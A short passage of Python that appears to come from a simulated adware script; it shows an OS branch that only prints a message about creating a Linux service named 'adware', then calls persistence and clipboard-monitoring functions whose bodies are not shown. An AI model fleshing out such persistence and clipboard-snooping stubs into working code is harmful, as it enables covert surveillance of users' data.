        elif system == "Linux":
            service_name = "adware"
            # Simulate creating a Linux service (this is just a placeholder)
            print(f"Creating Linux service: {service_name}")
        else:
            print("Unsupported operating system")
    
    create_persistence()
    monitor_clipboard()

